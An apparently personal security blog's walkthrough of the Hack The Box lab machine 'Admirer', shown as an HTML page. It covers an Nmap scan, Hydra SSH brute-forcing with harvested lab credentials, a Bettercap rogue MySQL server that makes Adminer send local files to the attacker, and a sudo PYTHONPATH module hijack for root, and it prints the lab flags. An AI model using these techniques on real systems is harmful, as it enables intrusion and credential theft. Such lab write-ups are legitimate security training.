@@ -1,0 +1,583 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, viewport-fit=cover">
+
+  <meta name="description" content="Personal blog about IT, Electronics, InfoSec, Hacking, Bug Hunting...">
+  <meta name="keywords" content="Blog, Computer Science, IT, Electronics, Hacking, InfoSec, CTF, Bug Bounty, Open Source">
+  <meta name="author" content="Paul-Emmanuel Raoul">
+
+  
+  <link rel="apple-touch-icon" sizes="180x180" href="&#x2F;favicon&#x2F;apple-touch-icon.png" />
+  
+  
+  <link rel="icon" type="image/png" sizes="16x16" href="&#x2F;favicon&#x2F;favicon-16x16.png" />
+  
+  
+  <link rel="icon" type="image/png" sizes="32x32" href="&#x2F;favicon&#x2F;favicon-32x32.png" />
+  
+  
+  <link rel="manifest" href="&#x2F;favicon&#x2F;site.webmanifest" />
+  
+
+  <title>Skyper&#x27;s blog</title>
+
+  <link rel="stylesheet" href="https://blog.skyplabs.net/css/style.css">
+
+  
+  <script defer data-domain="blog.skyplabs.net" src="https://plausible.io/js/plausible.js"></script>
+  
+
+  <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+  <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+
+  <link rel="alternate" type="application/atom+xml" title="RSS" href="https://blog.skyplabs.net/atom.xml">
+</head>
+<body vocab="http://schema.org/" typeof="Blog">
+  
+  <div class="sidebar">
+    <div class="container sidebar-sticky">
+      <div class="sidebar-about">
+        <h1><a href="https://blog.skyplabs.net">Skyper&#x27;s blog</a></h1>
+        <p class="lead">Personal blog about IT, Electronics, InfoSec, Hacking, Bug Hunting...</p>
+      </div>
+
+      <div class="sidebar-links">
+        
+        <a class="icon-github" href="https://github.com/SkypLabs" title="GitHub" target="_blank" rel="noopener noreferrer"></a>
+        
+
+        
+        <a class="icon-docker-hub" href="https://hub.docker.com/u/skyplabs" title="Docker Hub" target="_blank" rel="noopener noreferrer"></a>
+        
+
+        
+        
+        
+        <a class="icon-mastodon" href="https://fosstodon.org/@Skyper" title="Mastodon" target="_blank" rel="me noopener noreferrer"></a>
+        
+
+        
+        <a class="icon-twitter" href="https://twitter.com/SkypLabs" title="Twitter" target="_blank" rel="noopener noreferrer"></a>
+        
+
+        
+        <a class="icon-linkedin" href="https://www.linkedin.com/in/peraoul" title="LinkedIn" target="_blank" rel="noopener noreferrer"></a>
+        
+
+        
+        <a class="icon-keybase" href="https://keybase.io/skyplabs" title="Keybase" target="_blank" rel="noopener noreferrer"></a>
+        
+
+        
+        <a class="icon-email" href="mailto:skyper@skyplabs.net" title="Email"></a>
+        
+
+        <a class="icon-rss" href="https://blog.skyplabs.net/atom.xml" title="RSS"></a>
+      </div>
+
+      <nav class="sidebar-nav">
+        <a class="sidebar-nav-item" href="/">Home</a>
+        
+        
+        <a class="sidebar-nav-item" href="/publications/">Publications</a>
+        
+        <a class="sidebar-nav-item" href="/about/">About me</a>
+        
+        <a class="sidebar-nav-item" href="/contact/">Contact</a>
+        
+        <a class="sidebar-nav-item" href="/support/">Support me</a>
+        
+      </nav>
+    </div>
+  </div>
+  
+
+  <div class="content container">
+    
+<article class="post" property="blogPost" typeof="BlogPosting">
+  
+  <div class="post-meta">
+    
+    <h2 class="post-title" property="headline">[HTB] Admirer</h2>
+    
+
+    <time class="post-date" datetime="2020-10-02 00:00"
+      property="datePublished">02 Oct 2020</time>
+    <div class="post-author" property="author" typeof="Person" hidden>
+      <span property="name">Paul-Emmanuel Raoul</span>
+      <span property="givenName">Paul-Emmanuel</span>
+      <span property="familyName">Raoul</span>
+      <span property="alternateName">Skyper</span>
+      <span property="email">skyper@skyplabs.net</span>
+    </div>
+  </div>
+
+
+  <div class="post-content" property="articleBody">
+    <p>Admirer is an easy <a rel="noopener nofollow noreferrer" target="_blank" title="Hack The Box - Main Website" href="https://hackthebox.eu/">Hack The Box</a> Linux-based machine released on the 2nd
+of May 2020 and reachable on the IP address <code>10.10.10.187</code>.</p>
+<p>For whose who don't know it yet, Hack The Box is an online platform where
+vulnerable machines are deployed in a private network accessible via VPN, and
+where users need to hack their way into the systems to collect flags as proofs
+of their success.</p>
+<p><img src="/posts/htb-admirer/htb-admirer-info-card.jpg" alt="HTB Admirer information card" /></p>
+<span id="continue-reading"></span><h2 id="user-flag">User flag</h2>
+<p>Let's start with an Nmap scan:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>$ nmap -A 10.10.10.187
+</span><span>Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-17 09:39 EDT
+</span><span>Nmap scan report for 10.10.10.187
+</span><span>Host is up (0.033s latency).
+</span><span>Not shown: 997 closed ports
+</span><span>PORT   STATE SERVICE VERSION
+</span><span>21/tcp open  ftp     vsftpd 3.0.3
+</span><span>22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
+</span><span>| ssh-hostkey:
+</span><span>|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)
+</span><span>|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)
+</span><span>|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)
+</span><span>80/tcp open  http    Apache httpd 2.4.25 ((Debian))
+</span><span>| http-robots.txt: 1 disallowed entry
+</span><span>|_/admin-dir
+</span><span>|_http-server-header: Apache/2.4.25 (Debian)
+</span><span>|_http-title: Admirer
+</span><span>Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+</span><span>
+</span><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span><span>Nmap done: 1 IP address (1 host up) scanned in 10.72 seconds
+</span></code></pre>
+<p>The Nmap scan detected 3 TCP services:</p>
+<ul>
+<li>vsftpd on port 21</li>
+<li>OpenSSH on port 22</li>
+<li>Apache on port 80</li>
+</ul>
+<p>The FTP service doesn't allow anonymous access, otherwise Nmap would have told
+us about it (the Nmap script <a rel="noopener nofollow noreferrer" target="_blank" title="Nmap script ftp-anon" href="https://nmap.org/nsedoc/scripts/ftp-anon.html"><code>ftp-anon</code></a> is part of the
+&quot;default&quot; group of scripts).</p>
+<p>Regarding the website, Nmap extracted one hidden folder from <code>/robots.txt</code> named
+<code>admin-dir</code> for which the following comment can be read in the same file:</p>
+<blockquote>
+<p>This folder contains personal contacts and creds, so no one -not even robots-
+should see it - waldo</p>
+</blockquote>
+<p>At this point, I initially tried to fuzz the <code>/admin-dir</code> folder with some
+well-known security wordlists, but without any success. Then, I tried with a few
+combinations of filenames around the concepts of &quot;contacts&quot; and &quot;credentials&quot;,
+and the result didn't take long to come. I found the two files the above comment
+was referring to: <code>/admin-dir/contacts.txt</code> and <code>/admin-dir/credentials.txt</code>.</p>
+<p>The first one contains a list of email addresses with the first name and role of
+the persons as comments:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>##########
+</span><span># admins #
+</span><span>##########
+</span><span># Penny
+</span><span>Email: p.wise@admirer.htb
+</span><span>
+</span><span>
+</span><span>##############
+</span><span># developers #
+</span><span>##############
+</span><span># Rajesh
+</span><span>Email: r.nayyar@admirer.htb
+</span><span>
+</span><span># Amy
+</span><span>Email: a.bialik@admirer.htb
+</span><span>
+</span><span># Leonard
+</span><span>Email: l.galecki@admirer.htb
+</span><span>
+</span><span>
+</span><span>
+</span><span>#############
+</span><span># designers #
+</span><span>#############
+</span><span># Howard
+</span><span>Email: h.helberg@admirer.htb
+</span><span>
+</span><span># Bernadette
+</span><span>Email: b.rauch@admirer.htb
+</span></code></pre>
+<p>And the second one some credentials for different services:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>[Internal mail account]
+</span><span>w.cooper@admirer.htb
+</span><span>fgJr6q#S\W:$P
+</span><span>
+</span><span>[FTP account]
+</span><span>ftpuser
+</span><span>%n?4Wz}R$tTF7
+</span><span>
+</span><span>[Wordpress account]
+</span><span>admin
+</span><span>w0rdpr3ss01!
+</span></code></pre>
+<p>With the FTP credentials, I could download these 2 files from vsftpd:</p>
+<ul>
+<li><code>html.tar.gz</code></li>
+<li><code>dump.sql</code></li>
+</ul>
+<p>The SQL backup doesn't contain anything interesting but <code>html.tar.gz</code> reveals
+the website structure:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>$ tree html
+</span><span>html
+</span><span>├── assets
+</span><span>│   ├── css
+</span><span>│   │   ├── fontawesome-all.min.css
+</span><span>│   │   ├── images
+</span><span>│   │   │   ├── arrow.svg
+</span><span>│   │   │   ├── close.svg
+</span><span>│   │   │   └── spinner.svg
+</span><span>│   │   ├── main.css
+</span><span>│   │   └── noscript.css
+</span><span>│   ├── js
+</span><span>│   │   ├── breakpoints.min.js
+</span><span>│   │   ├── browser.min.js
+</span><span>│   │   ├── jquery.min.js
+</span><span>│   │   ├── jquery.poptrox.min.js
+</span><span>│   │   ├── main.js
+</span><span>│   │   └── util.js
+</span><span>│   ├── sass
+</span><span>│   │   ├── base
+</span><span>│   │   │   ├── _page.scss
+</span><span>│   │   │   ├── _reset.scss
+</span><span>│   │   │   └── _typography.scss
+</span><span>│   │   ├── components
+</span><span>│   │   │   ├── _actions.scss
+</span><span>│   │   │   ├── _button.scss
+</span><span>│   │   │   ├── _form.scss
+</span><span>│   │   │   ├── _icon.scss
+</span><span>│   │   │   ├── _icons.scss
+</span><span>│   │   │   ├── _list.scss
+</span><span>│   │   │   ├── _panel.scss
+</span><span>│   │   │   ├── _poptrox-popup.scss
+</span><span>│   │   │   └── _table.scss
+</span><span>│   │   ├── layout
+</span><span>│   │   │   ├── _footer.scss
+</span><span>│   │   │   ├── _header.scss
+</span><span>│   │   │   ├── _main.scss
+</span><span>│   │   │   └── _wrapper.scss
+</span><span>│   │   ├── libs
+</span><span>│   │   │   ├── _breakpoints.scss
+</span><span>│   │   │   ├── _functions.scss
+</span><span>│   │   │   ├── _mixins.scss
+</span><span>│   │   │   ├── _vars.scss
+</span><span>│   │   │   └── _vendor.scss
+</span><span>│   │   ├── main.scss
+</span><span>│   │   └── noscript.scss
+</span><span>│   └── webfonts
+</span><span>│       ├── fa-brands-400.eot
+</span><span>│       ├── fa-brands-400.svg
+</span><span>│       ├── fa-brands-400.ttf
+</span><span>│       ├── fa-brands-400.woff
+</span><span>│       ├── fa-brands-400.woff2
+</span><span>│       ├── fa-regular-400.eot
+</span><span>│       ├── fa-regular-400.svg
+</span><span>│       ├── fa-regular-400.ttf
+</span><span>│       ├── fa-regular-400.woff
+</span><span>│       ├── fa-regular-400.woff2
+</span><span>│       ├── fa-solid-900.eot
+</span><span>│       ├── fa-solid-900.svg
+</span><span>│       ├── fa-solid-900.ttf
+</span><span>│       ├── fa-solid-900.woff
+</span><span>│       └── fa-solid-900.woff2
+</span><span>├── images
+</span><span>│   ├── fulls
+</span><span>│   │   ├── arch01.jpg
+</span><span>│   │   ├── arch02.jpg
+</span><span>│   │   ├── art01.jpg
+</span><span>│   │   ├── art02.jpg
+</span><span>│   │   ├── eng01.jpg
+</span><span>│   │   ├── eng02.jpg
+</span><span>│   │   ├── mind01.jpg
+</span><span>│   │   ├── mind02.jpg
+</span><span>│   │   ├── mus01.jpg
+</span><span>│   │   ├── mus02.jpg
+</span><span>│   │   ├── nat01.jpg
+</span><span>│   │   └── nat02.jpg
+</span><span>│   └── thumbs
+</span><span>│       ├── thmb_arch01.jpg
+</span><span>│       ├── thmb_arch02.jpg
+</span><span>│       ├── thmb_art01.jpg
+</span><span>│       ├── thmb_art02.jpg
+</span><span>│       ├── thmb_eng01.jpg
+</span><span>│       ├── thmb_eng02.jpg
+</span><span>│       ├── thmb_mind01.jpg
+</span><span>│       ├── thmb_mind02.jpg
+</span><span>│       ├── thmb_mus01.jpg
+</span><span>│       ├── thmb_mus02.jpg
+</span><span>│       ├── thmb_nat01.jpg
+</span><span>│       └── thmb_nat02.jpg
+</span><span>├── index.php
+</span><span>├── robots.txt
+</span><span>├── utility-scripts
+</span><span>│   ├── admin_tasks.php
+</span><span>│   ├── db_admin.php
+</span><span>│   ├── info.php
+</span><span>│   └── phptest.php
+</span><span>└── w4ld0s_s3cr3t_d1r
+</span><span>    ├── contacts.txt
+</span><span>    └── credentials.txt
+</span><span>
+</span><span>15 directories, 82 files
+</span></code></pre>
+<p>The structure of the backup is almost the same as the one of the live website.
+Only <code>w4ld0s_s3cr3t_d1r</code> has a different name (<code>admin-dir</code> on the live website).</p>
+<p>After inspection, I found a couple of credentials in different files. In
+<code>index.php</code> (note the non-escaped double quotes in the password):</p>
+<pre data-lang="php" style="background-color:#2b303b;color:#c0c5ce;" class="language-php "><code class="language-php" data-lang="php"><span>$servername = &quot;localhost&quot;;
+</span><span>$username = &quot;waldo&quot;;
+</span><span>$password = &quot;]F7jLHw:*G&gt;UPrTo}~A&quot;d6b&quot;;
+</span><span>$dbname = &quot;admirerdb&quot;;
+</span></code></pre>
+<p>In <code>utility-scripts/db_admin.php</code>:</p>
+<pre data-lang="php" style="background-color:#2b303b;color:#c0c5ce;" class="language-php "><code class="language-php" data-lang="php"><span>$servername = &quot;localhost&quot;;
+</span><span>$username = &quot;waldo&quot;;
+</span><span>$password = &quot;Wh3r3_1s_w4ld0?&quot;;
+</span></code></pre>
+<p>And in <code>w4ld0s_s3cr3t_d1r/credentials.txt</code> (the same file on the live website
+doesn't contain the bank account):</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>[Bank Account]
+</span><span>waldo.11
+</span><span>Ezy]m27}OREc$
+</span><span>
+</span><span>[Internal mail account]
+</span><span>w.cooper@admirer.htb
+</span><span>fgJr6q#S\W:$P
+</span><span>
+</span><span>[FTP account]
+</span><span>ftpuser
+</span><span>%n?4Wz}R$tTF7
+</span><span>
+</span><span>[Wordpress account]
+</span><span>admin
+</span><span>w0rdpr3ss01!
+</span></code></pre>
+<p>With all these credentials, I made two wordlists. One with the different
+usernames:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>waldo
+</span><span>waldo.11
+</span><span>admin
+</span><span>ftpuser
+</span><span>w.cooper@admirer.htb
+</span><span>p.wise@admirer.htb
+</span><span>r.nayyar@admirer.htb
+</span><span>a.bialik@admirer.htb
+</span><span>l.galecki@admirer.htb
+</span><span>h.helberg@admirer.htb
+</span><span>b.rauch@admirer.htb
+</span><span>w.cooper
+</span><span>p.wise
+</span><span>r.nayyar
+</span><span>a.bialik
+</span><span>l.galecki
+</span><span>h.helberg
+</span><span>b.rauch
+</span></code></pre>
+<p>And another one with the different passwords:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>Wh3r3_1s_w4ld0?
+</span><span>]F7jLHw:*G&gt;UPrTo}~A
+</span><span>]F7jLHw:*G&gt;UPrTo}~A&quot;d6b
+</span><span>Ezy]m27}OREc$
+</span><span>fgJr6q#S\W:$P
+</span><span>%n?4Wz}R$tTF7
+</span><span>w0rdpr3ss01!
+</span></code></pre>
+<p>Then, I tried to brute-force the SSH service with <a rel="noopener nofollow noreferrer" target="_blank" title="Kali Tools - Hydra Package Description" href="https://tools.kali.org/password-attacks/hydra">Hydra</a>:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>$ hydra -L usernames.txt -P passwords.txt -t 4 10.10.10.187 ssh
+</span><span>Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+</span><span>
+</span><span>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-07-18 06:22:59
+</span><span>[DATA] max 4 tasks per 1 server, overall 4 tasks, 126 login tries (l:18/p:7), ~32 tries per task
+</span><span>[DATA] attacking ssh://10.10.10.187:22/
+</span><span>[22][ssh] host: 10.10.10.187   login: ftpuser   password: %n?4Wz}R$tTF7
+</span><span>[STATUS] 106.00 tries/min, 106 tries in 00:01h, 20 to do in 00:01h, 4 active
+</span><span>1 of 1 target successfully completed, 1 valid password found
+</span><span>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-07-18 06:24:11
+</span></code></pre>
+<p>The FTP credentials worked but the connection is automatically closed before
+accessing any shell. I also tried the same brute-forcing technique on the FTP
+service but with no more luck.</p>
+<p>I decided to have a closer look at the files in the backup, and I eventually
+stumbled upon this comment in <code>utility-scripts/db_admin.php</code>:</p>
+<blockquote>
+<p>// TODO: Finish implementing this or find a better open source alternative</p>
+</blockquote>
+<p>After a quick search on the internet for &quot;phpmyadmin equivalents&quot;, I found a
+tool called &quot;Adminer&quot;. Bingo!</p>
+<p><img src="https://blog.skyplabs.net/posts/htb-admirer/htb-admirer-adminer-login.png" alt="HTB Admirer Adminer login page" /></p>
+<p>The Adminer dashboard is accessible at
+<code>http://10.10.10.187/utility-scripts/adminer.php</code>. I tried the different
+credentials I had collected so far but nothing worked. Then, I checked the known
+vulnerabilities of Adminer v4.6.2 (the version number is indicated on the login
+page) and it turned out that <a rel="noopener nofollow noreferrer" target="_blank" title="Adminer Script Results to Pwning Server?, Private Bug Bounty Program" href="https://infosecwriteups.com/adminer-script-results-to-pwning-server-private-bug-bounty-program-fe6d8a43fe6f">there is a way to read arbitrary files on the
+remote machine</a>.</p>
+<p>The attack takes place in 2 steps:</p>
+<ul>
+<li>Instead of trying to log in the local database of the remote system, an
+attacker can log in a public RDBMS they own.</li>
+<li>Then, the attacker can execute <code>LOCAL INFILE</code> SQL queries to read arbitrary
+files on the remote filesystem.</li>
+</ul>
+<p><a rel="noopener nofollow noreferrer" target="_blank" title="Bettercap Official Website" href="https://www.bettercap.org/">Bettercap</a> has a <a rel="noopener nofollow noreferrer" target="_blank" title="Bettercap MySQL module" href="https://www.bettercap.org/modules/ethernet/servers/mysql.server/">module to set up a rogue MySQL
+server</a> to read files from the victim using the
+technique previously mentioned. To do so, I created a <a rel="noopener nofollow noreferrer" target="_blank" title="Bettercap - Caplets" href="https://www.bettercap.org/usage/interactive/#caplets">caplet
+script</a> with the following content:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span># Replace with your HTB VPN IP address.
+</span><span>set mysql.server.address 10.10.14.17
+</span><span>set mysql.server.port 3306
+</span><span># The file you want to read from the remote machine.
+</span><span>set mysql.server.infile ../index.php
+</span><span>mysql.server on
+</span></code></pre>
+<p>And to start Bettercap:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span># bettercap -caplet adminer-mysql.cap
+</span></code></pre>
+<p>Before going further, make sure to accept incoming connections from the remote
+server. If you are on a Linux-based system like myself, add this Netfilter rule
+with <code>iptables</code>:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span># iptables -I INPUT 1 -s 10.10.10.187 -j ACCEPT
+</span></code></pre>
+<p>To start the attack, I just needed to ask Adminer to connect to my rogue server
+via the login form. Since I used a fake MySQL server, I could enter any
+username, password and database name I wanted. It worked well and I could
+retrieve the actual MySQL credentials used by the PHP application:</p>
+<pre data-lang="php" style="background-color:#2b303b;color:#c0c5ce;" class="language-php "><code class="language-php" data-lang="php"><span>$servername = &quot;localhost&quot;;
+</span><span>$username = &quot;waldo&quot;;
+</span><span>$password = &quot;&amp;&lt;</span><span style="color:#bf616a;">h5b~yK3F#{PaPB&amp;dA}{H</span><span>&gt;&quot;;
+</span></code></pre>
+<p>And these credentials are the ones of an actual UNIX account!</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>$ ssh waldo@10.10.10.187
+</span><span>waldo@10.10.10.187&#39;s password:
+</span><span>Linux admirer 4.9.0-12-amd64 x86_64 GNU/Linux
+</span><span>
+</span><span>The programs included with the Devuan GNU/Linux system are free software;
+</span><span>the exact distribution terms for each program are described in the
+</span><span>individual files in /usr/share/doc/*/copyright.
+</span><span>
+</span><span>Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+</span><span>permitted by applicable law.
+</span><span>You have new mail.
+</span><span>Last login: Wed Apr 29 10:56:59 2020 from 10.10.14.3
+</span><span>waldo@admirer:~$ ls
+</span><span>user.txt
+</span><span>waldo@admirer:~$ cat user.txt
+</span><span>19fd5ec7c90993b3fafd9e778cb221ca
+</span></code></pre>
+<h2 id="root-flag">Root flag</h2>
+<p>After a bit of enumeration, I quickly realised that <code>waldo</code> had the permission
+to run <code>/opt/scripts/admin_tasks.sh</code> on behalf of <code>root</code>:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>$ sudo -l
+</span><span>[sudo] password for waldo:
+</span><span>Matching Defaults entries for waldo on admirer:
+</span><span>    env_reset, env_file=/etc/sudoenv, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, listpw=always
+</span><span>
+</span><span>User waldo may run the following commands on admirer:
+</span><span>    (ALL) SETENV: /opt/scripts/admin_tasks.sh
+</span></code></pre>
+<p>When running this shell script, the user is prompted to select an admin task to
+execute:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>$ sudo /opt/scripts/admin_tasks.sh
+</span><span>
+</span><span>[[[ System Administration Menu ]]]
+</span><span>1) View system uptime
+</span><span>2) View logged in users
+</span><span>3) View crontab
+</span><span>4) Backup passwd file
+</span><span>5) Backup shadow file
+</span><span>6) Backup web data
+</span><span>7) Backup DB
+</span><span>8) Quit
+</span><span>Choose an option:
+</span></code></pre>
+<p>After inspection of the source code, the only promising element I found for a
+privilege escalation was the call to the Python script <code>/opt/scripts/backup.py</code>
+(belonging to <code>root</code> as well):</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#8fa1b3;">backup_web</span><span>()
+</span><span>{
+</span><span>    </span><span style="color:#b48ead;">if </span><span style="color:#96b5b4;">[ </span><span>&quot;$</span><span style="color:#bf616a;">EUID</span><span>&quot; </span><span style="color:#bf616a;">-eq</span><span> 0 </span><span style="color:#96b5b4;">]
+</span><span>    </span><span style="color:#b48ead;">then
+</span><span>        </span><span style="color:#96b5b4;">echo </span><span>&quot;</span><span style="color:#a3be8c;">Running backup script in the background, it might take a while...</span><span>&quot;
+</span><span>        </span><span style="color:#bf616a;">/opt/scripts/backup.py </span><span>&amp;
+</span><span>    </span><span style="color:#b48ead;">else
+</span><span>        </span><span style="color:#96b5b4;">echo </span><span>&quot;</span><span style="color:#a3be8c;">Insufficient privileges to perform the selected operation.</span><span>&quot;
+</span><span>    </span><span style="color:#b48ead;">fi
+</span><span>}
+</span></code></pre>
+<p>This backup tool imports the <code>make_archive</code> function from the <code>shutil</code> module to
+generate a <code>gztar</code> archive of the <code>/var/www/html</code> folder:</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#65737e;">#!/usr/bin/python3
+</span><span>
+</span><span style="color:#b48ead;">from </span><span>shutil </span><span style="color:#b48ead;">import </span><span>make_archive
+</span><span>
+</span><span>src = &#39;</span><span style="color:#a3be8c;">/var/www/html/</span><span>&#39;
+</span><span>
+</span><span style="color:#65737e;"># old ftp directory, not used anymore
+</span><span style="color:#65737e;">#dst = &#39;/srv/ftp/html&#39;
+</span><span>
+</span><span>dst = &#39;</span><span style="color:#a3be8c;">/var/backups/html</span><span>&#39;
+</span><span>
+</span><span style="color:#bf616a;">make_archive</span><span>(dst, &#39;</span><span style="color:#a3be8c;">gztar</span><span>&#39;, src)
+</span></code></pre>
+<p>In Python, the folders where the interpreter looks for the modules you try to
+import are listed in the <a rel="noopener nofollow noreferrer" target="_blank" title="Python 3 Documentation - PYTHONPATH" href="https://docs.python.org/3/using/cmdline.html#envvar-PYTHONPATH"><code>PYTHONPATH</code></a> environment variable, just
+like <code>PATH</code> in a shell. Given that the <code>SETENV</code> option is set in the <code>sudoers</code>
+policy module for the execution of <code>/opt/scripts/admin_tasks.sh</code> by <code>waldo</code>, the
+value of <code>PYTHONPATH</code> can be overwritten, allowing to inject custom versions of
+the imported modules.</p>
+<p>It is exactly the strategy I followed. I created another module named <code>shutil</code>
+containing my own implementation of <code>make_archive</code>:</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">make_archive</span><span>(</span><span style="color:#bf616a;">x</span><span>, </span><span style="color:#bf616a;">y</span><span>, </span><span style="color:#bf616a;">z</span><span>):
+</span><span>    </span><span style="color:#b48ead;">with </span><span style="color:#96b5b4;">open</span><span>(&#39;</span><span style="color:#a3be8c;">/root/root.txt</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">r</span><span>&#39;) </span><span style="color:#b48ead;">as </span><span>f:
+</span><span>        </span><span style="color:#96b5b4;">print</span><span>(f.</span><span style="color:#bf616a;">readline</span><span>())
+</span></code></pre>
+<p>I placed this Python script in <code>/tmp/shutil/__init__.py</code> and then:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>$ sudo PYTHONPATH=/tmp /opt/scripts/admin_tasks.sh 6
+</span><span>Running backup script in the background, it might take a while...
+</span><span>$ 86875a82845fa2c5f211500a85d78f5c
+</span><span>
+</span><span>
+</span><span>$
+</span></code></pre>
+<p>The root flag was <code>cf943b5f4a33dc4b9a438550d232915f</code>.</p>
+<h2 id="wrapping-up">Wrapping up</h2>
+<p>It was an easy machine, as expected. It still allowed me to discover the Adminer
+project and it was also an occasion for me to use the rogue MySQL server of
+Bettercap.</p>
+
+  </div>
+
+  
+  
+  <span class="categories" property="keywords">
+    
+    
+    <a href="https:&#x2F;&#x2F;blog.skyplabs.net&#x2F;categories&#x2F;security&#x2F;">Security</a>
+    
+    
+  </span>
+  
+
+  
+  <span class="tags" property="keywords">
+    
+    
+    <a href="https:&#x2F;&#x2F;blog.skyplabs.net&#x2F;tags&#x2F;ctf&#x2F;">CTF</a>
+     · 
+    
+    
+    <a href="https:&#x2F;&#x2F;blog.skyplabs.net&#x2F;tags&#x2F;web&#x2F;">Web</a>
+    
+    
+  </span>
+  
+
+</article>
+
+  </div>
+  <script type="text/javascript" src="https://blog.skyplabs.net/elasticlunr.min.js"></script>
+  <script type="text/javascript" src="https://blog.skyplabs.net/search_index.en.js"></script>
+  <script type="text/javascript" src="https://blog.skyplabs.net/js/search.js"></script>
+</body>
+</html>
